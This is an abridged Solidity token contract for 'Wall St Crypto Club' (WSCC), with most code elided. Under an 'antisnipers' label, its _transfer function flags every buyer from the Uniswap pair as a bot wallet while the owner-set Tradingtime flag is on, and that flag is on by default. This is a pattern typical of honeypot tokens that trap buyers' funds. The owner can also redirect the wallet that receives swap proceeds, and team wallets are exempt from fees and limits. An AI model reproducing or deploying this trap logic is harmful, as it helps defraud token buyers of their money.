...
contract WallStCryptoClub is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 400 * 10**21 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    address payable public _marketingAddress =
        payable(address(0x7dA0f657A07b1C5881AfE2Dfaf7A88e90c50d1B6));
    address payable public _HedgeFundBuybackWallet =
        payable(address(0xcf390E20971B276c0De8cA8d3748F7a555b43C1e));
    address _partnershipswallet =
        payable(address(0x7dA0f657A07b1C5881AfE2Dfaf7A88e90c50d1B6));
    address private _donationAddress =
        0x000000000000000000000000000000000000dEaD;

    string private _name = "Wall St Crypto Club";
    string private _symbol = "WSCC";
    ...
    uint256 public _maxTxAmount = 42000 * 10**19 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 420 * 10**19 * 10**9;
    uint256 public _maxWalletSize = 42000 * 10**19 * 10**9;
    
    // antisnipers
    mapping (address => bool) private botWallets;
    address[] private botsWallet;
    bool public Tradingtime = true;
    ...
    constructor() {
        ...
        _isExcludedFromFee[_HedgeFundBuybackWallet] = true;
        _isExcludedFromFee[_partnershipswallet] = true;

        _isExcludedFromLimit[_marketingAddress] = true;
        _isExcludedFromLimit[_HedgeFundBuybackWallet] = true;
    ...
    function updateHedgeFundBuybackWallet(address payable newAddress) external onlyOwner {
        _HedgeFundBuybackWallet = newAddress;
    }
    ...
    function Bullrun() public onlyOwner {
    ...
    function setTradingtime(bool on) public onlyOwner {
        Tradingtime = on;
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && Tradingtime) {
            botWallets[to] = true;
            botsWallet.push(to);
        }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        ...
        if (teamAmt > 0) {
            _HedgeFundBuybackWallet.transfer(teamAmt);
        }
    }
